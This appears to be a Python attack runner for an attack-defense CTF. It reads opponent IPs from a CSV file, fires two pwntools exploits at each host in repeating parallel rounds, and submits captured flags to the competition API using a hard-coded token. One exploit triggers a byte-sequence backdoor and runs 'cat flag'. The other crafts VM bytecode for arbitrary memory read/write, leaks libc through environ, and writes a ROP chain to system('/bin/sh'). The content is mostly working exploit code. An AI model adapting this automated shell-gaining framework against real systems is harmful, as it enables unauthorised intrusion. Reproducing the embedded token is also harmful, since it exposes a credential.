#!/usr/bin/env python3
"""
Robust CTF Exploit Runner
- Reads targets from mqda.csv
- Tries mqda_1 exploit first, then mqda_2
- Submits flags to API with rate limiting (10 TPS)
- Parallel execution with logging
"""

import os
os.environ['PWNLIB_NOTERM'] = '1'  # Must be before pwntools import

import re
import sys
import time
import logging
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from pwn import *

# === CONFIG ===
API_URL = "https://platform.ctf.hkcert.org/api/ct/web/awd_race/race/4734afdc0363e27749622afa758db50c/flag/robot/"
TOKEN = "6b1b78422325c363704038b207cb8c31"
TARGET_PORT = 9999  # Adjust if different
MAX_WORKERS = 5     # Parallel exploit threads
ROUND_DELAY = 30    # Seconds between rounds (shorter since we skip recently pwned)
FLAG_COOLDOWN = 300 # 5 minutes - don't re-exploit if pwned within this time
# Common flag patterns
FLAG_REGEX = re.compile(rb'(hkcert24\{[a-zA-Z0-9_-]+\}|flag\{[a-zA-Z0-9_-]+\})')

# Rate limiter for API (10 TPS)
submit_lock = threading.Lock()
last_submit_time = 0

# Track when each target was last successfully pwned
# Key: IP, Value: timestamp
pwned_times = {}
pwned_lock = threading.Lock()

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.getLogger("exploit")

# Suppress pwntools noise completely
context.log_level = 'critical'
context.timeout = 10

# Get script directory for libc path
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LIBC_PATH = os.path.join(SCRIPT_DIR, "libc.so.6")
if not os.path.exists(LIBC_PATH):
    LIBC_PATH = os.path.join(SCRIPT_DIR, "challenge", "libc.so.6")

def parse_targets(csv_path):
    """Parse mqda.csv to extract target IPs."""
    targets = []
    with open(csv_path, 'r') as f:
        lines = f.readlines()
    
    i = 0
    while i < len(lines):
        line = lines[i].strip()
        if line.startswith('Name,') and 'Guest_Node' in line:
            name = line.split(',')[1] if ',' in line else 'Unknown'
            if i + 1 < len(lines):
                ip_line = lines[i + 1].strip()
                if ip_line.startswith('IP,'):
                    ip = ip_line.split(',')[1]
                    targets.append({'name': name, 'ip': ip})
        i += 1
    
    return targets

def rate_limited_submit(flag):
    """Submit flag with rate limiting (10 TPS max)."""
    global last_submit_time
    
    with submit_lock:
        now = time.time()
        elapsed = now - last_submit_time
        if elapsed < 0.15:  # ~7 TPS to stay safely under 10 TPS limit
            time.sleep(0.15 - elapsed)
        last_submit_time = time.time()
    
    try:
        if isinstance(flag, bytes):
            flag = flag.decode()
        
        headers = {"Content-Type": "application/json"}
        data = {"flag": flag, "token": TOKEN}
        
        response = requests.post(API_URL, headers=headers, json=data, timeout=10)
        result = response.json()
        
        if result.get("code") == "AD-000000":
            is_dup = result.get("data", {}).get("is_duplicate", False)
            if is_dup:
                log.info(f"[SUBMIT] {flag[:30]}... (duplicate)")
            else:
                log.info(f"[SUBMIT] *** NEW FLAG! *** {flag[:30]}...")
            return True
        else:
            log.warning(f"[SUBMIT] Failed: {result.get('message', 'unknown error')}")
            return False
    except Exception as e:
        log.error(f"[SUBMIT] Error: {e}")
        return False

def exploit_1(ip, port):
    """
    Try exploit 1 (backdoor trigger from mqda_1.py).
    Returns flag bytes or None.
    """
    try:
        p = remote(ip, port, timeout=5)
        p.recvuntil(b"> ", timeout=5)
        p.send(b"\x21\x23\x89\x33")
        p.sendline(b"echo HACKED_MARKER && cat flag")
        p.recvuntil(b"HACKED_MARKER\n", timeout=5)
        data = p.recv(timeout=3)
        p.close()
        
        # Try to find flag pattern
        match = FLAG_REGEX.search(data)
        if match:
            return match.group(0)
        # Fallback: return raw data if it looks like a flag
        if b'{' in data and b'}' in data:
            return data.strip()
        return None
    except Exception as e:
        try:
            p.close()
        except:
            pass
        return None

def exploit_2(ip, port):
    """
    Try exploit 2 (VM ROP chain from mqda_2.py).
    Returns flag bytes or None.
    """
    try:
        if not os.path.exists(LIBC_PATH):
            log.warning(f"libc.so.6 not found at {LIBC_PATH}")
            return None
            
        libc = ELF(LIBC_PATH, checksec=False)
        p = remote(ip, port, timeout=10)
        
        # VM instruction helpers
        R, RR, RV, LR, RL = 0, 1, 2, 3, 4
        
        def MOV(MD, V1=b'', V2=b''):
            OPM = 1 | (MD << 5)
            return OPM.to_bytes(1, "little") + V1 + V2
        
        def SUB(MD, V1=b'', V2=b''):
            OPM = 5 | (MD << 5)
            return OPM.to_bytes(1, "little") + V1 + V2
        
        def ADD(MD, V1=b'', V2=b''):
            OPM = 4 | (MD << 5)
            return OPM.to_bytes(1, "little") + V1 + V2
        
        def ARW(RA, RB, R0, R1):
            EXP = b''
            EXP += MOV(RV, p8(2), p32(0x40330 - 4))
            EXP += MOV(LR, p8(2), p8(RA))
            EXP += MOV(RV, p8(2), p32(0x40330))
            EXP += MOV(LR, p8(2), p8(RB))
            EXP += MOV(RV, p8(2), p32(0x40400))
            EXP += MOV(LR, p8(2), p8(R0))
            EXP += MOV(RV, p8(2), p32(0x40404))
            EXP += MOV(LR, p8(2), p8(R1))
            return EXP
        
        def ARR(RA, RB, R1, R2):
            EXP = b''
            EXP += MOV(RR, p8(1), p8(RA))
            EXP += MOV(RV, p8(2), p32(0x40330 - 4))
            EXP += MOV(LR, p8(2), p8(1))
            EXP += MOV(RR, p8(1), p8(RB))
            EXP += MOV(RV, p8(2), p32(0x40330))
            EXP += MOV(LR, p8(2), p8(1))
            EXP += MOV(RV, p8(2), p32(0x40400))
            EXP += MOV(RL, p8(R1), p8(2))
            EXP += MOV(RV, p8(2), p32(0x40404))
            EXP += MOV(RL, p8(R2), p8(2))
            return EXP

        # Build exploit payload
        EXP = b''
        
        EXP += MOV(RV, p8(1), p32(0x1234))
        for i in range(0x100, 0x120):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
        
        EXP += MOV(RV, p8(1), p32(0))
        for i in range(0x108, 0x11f):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
        
        EXP += MOV(RV, p8(1), p32(0x5678))
        for i in range(0x108, 0x108+7):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
        
        EXP += MOV(RV, p8(2), p32(0x11004))
        EXP += MOV(RL, p8(3), p8(2))
        EXP += MOV(RV, p8(2), p32(0x11008))
        EXP += MOV(RL, p8(4), p8(2))
        
        offset = libc.symbols["_IO_2_1_stdin_"] + 0x1e0 + 1664
        EXP += MOV(RV, p8(5), p32(offset))
        EXP += SUB(RR, p8(3), p8(5))
        
        EXP += MOV(RV, p8(2), p32(0x1100c))
        EXP += MOV(RL, p8(6), p8(2))
        EXP += MOV(RV, p8(2), p32(0x11010))
        EXP += MOV(RL, p8(7), p8(2))
        
        EXP += MOV(RV, p8(8), p32(0x3980))
        EXP += SUB(RR, p8(6), p8(8))
        
        EXP += MOV(RV, p8(1), p32(0xaaaa))
        for i in range(0x230, 0x238):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
        
        EXP += MOV(RV, p8(1), p32(0xbbbb))
        for i in range(0x300, 0x320):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
        EXP += MOV(RV, p8(1), p32(0))
        for i in range(0x300, 0x308 + 7 + 1):
            EXP += MOV(RV, p8(2), p32(i * 0x100))
            EXP += MOV(LR, p8(2), p8(1))
        
        EXP += MOV(RV, p8(1), p32(0xcccc))
        EXP += MOV(RV, p8(2), p32(0x43000))
        EXP += MOV(LR, p8(2), p8(1))
        
        target = libc.symbols["environ"]
        EXP += MOV(RV, p8(9), p32(target - 4))
        EXP += ADD(RR, p8(3), p8(9))
        EXP += ARR(3, 4, 10, 11)
        EXP += SUB(RR, p8(3), p8(9))
        
        ret_address_offset = 0x120
        EXP += MOV(RV, p8(1), p32(ret_address_offset + 4))
        EXP += SUB(RR, p8(10), p8(1))
        
        rdi = 0x000000000002a3e5
        ret = rdi + 1
        
        offsets = [ret, rdi, next(libc.search(b"/bin/sh")), libc.symbols["system"]]
        for i in range(len(offsets)):
            EXP += MOV(RV, p8(9), p32(offsets[i]))
            EXP += ADD(RR, p8(3), p8(9))
            EXP += ARW(10, 11, 3, 4)
            EXP += MOV(RV, p8(1), p32(8))
            EXP += ADD(RR, p8(10), p8(1))
            EXP += SUB(RR, p8(3), p8(9))
        
        # Use the correct prompts from mqda_2.py
        p.recvuntil(b"Address> ", timeout=5)
        p.sendline(str(0x1000).encode())
        p.recvuntil(b"Length> ", timeout=5)
        p.sendline(str(len(EXP)).encode())
        p.recvuntil(b"Code> ", timeout=5)
        p.send(EXP)
        p.recvuntil(b"IP> ", timeout=5)
        p.sendline(str(0x1000).encode())
        
        time.sleep(0.5)
        p.sendline(b"echo HACKED_MARKER && cat flag")
        data = p.recv(timeout=3)
        p.close()
        
        match = FLAG_REGEX.search(data)
        if match:
            return match.group(0)
        return None
    except Exception as e:
        try:
            p.close()
        except:
            pass
        return None

def attack_target(target):
    """Attack a single target with both exploits."""
    ip = target['ip']
    name = target['name']
    
    log.info(f"[{name}] Attacking {ip}...")
    
    # Try exploit 1 first (simpler/faster)
    flag = exploit_1(ip, TARGET_PORT)
    if flag:
        log.info(f"[{name}] Exploit 1 SUCCESS: {flag[:40]}...")
        rate_limited_submit(flag)
        # Record successful pwn time
        with pwned_lock:
            pwned_times[ip] = time.time()
        return {'name': name, 'ip': ip, 'exploit': 1, 'flag': flag}
    
    log.warning(f"[{name}] Exploit 1 failed, trying exploit 2...")
    
    # Try exploit 2
    flag = exploit_2(ip, TARGET_PORT)
    if flag:
        log.info(f"[{name}] Exploit 2 SUCCESS: {flag[:40]}...")
        rate_limited_submit(flag)
        # Record successful pwn time
        with pwned_lock:
            pwned_times[ip] = time.time()
        return {'name': name, 'ip': ip, 'exploit': 2, 'flag': flag}
    
    log.error(f"[{name}] Both exploits failed on {ip}")
    return {'name': name, 'ip': ip, 'exploit': None, 'flag': None}

def get_targets_to_attack(targets):
    """Filter targets - skip those pwned within last FLAG_COOLDOWN seconds."""
    now = time.time()
    to_attack = []
    skipped = []
    
    with pwned_lock:
        for t in targets:
            ip = t['ip']
            last_pwned = pwned_times.get(ip, 0)
            time_since_pwn = now - last_pwned
            
            if time_since_pwn >= FLAG_COOLDOWN:
                to_attack.append(t)
            else:
                remaining = int(FLAG_COOLDOWN - time_since_pwn)
                skipped.append((t['name'], remaining))
    
    return to_attack, skipped

def run_round(targets):
    """Run one round of attacks on all targets."""
    # Filter out recently pwned targets
    to_attack, skipped = get_targets_to_attack(targets)
    
    if skipped:
        log.info(f"Skipping {len(skipped)} recently pwned targets:")
        for name, remaining in skipped:
            log.info(f"  - {name} (cooldown: {remaining}s)")
    
    if not to_attack:
        log.info("No targets to attack this round (all on cooldown)")
        return {'success': 0, 'failed': 0, 'skipped': len(skipped)}
    
    log.info(f"=== Attacking {len(to_attack)} targets ({len(skipped)} on cooldown) ===")
    
    results = {'success': 0, 'failed': 0, 'skipped': len(skipped)}
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(attack_target, t): t for t in to_attack}
        
        for future in as_completed(futures):
            result = future.result()
            if result['flag']:
                results['success'] += 1
            else:
                results['failed'] += 1
    
    log.info(f"=== Round complete: {results['success']} success, {results['failed']} failed, {results['skipped']} skipped ===")
    return results

def main():
    log.info("CTF Exploit Runner starting...")
    
    # Parse targets
    targets = parse_targets('mqda.csv')
    log.info(f"Loaded {len(targets)} targets from mqda.csv")
    
    for t in targets:
        log.info(f"  - {t['name']}: {t['ip']}")
    
    round_num = 0
    while True:
        round_num += 1
        log.info(f"\n{'='*50}")
        log.info(f"ROUND {round_num}")
        log.info(f"{'='*50}")
        
        try:
            run_round(targets)
        except KeyboardInterrupt:
            log.info("Interrupted by user, exiting...")
            break
        except Exception as e:
            log.error(f"Round error: {e}")
        
        log.info(f"Sleeping {ROUND_DELAY}s before next round...")
        try:
            time.sleep(ROUND_DELAY)
        except KeyboardInterrupt:
            log.info("Interrupted by user, exiting...")
            break

if __name__ == "__main__":
    main()
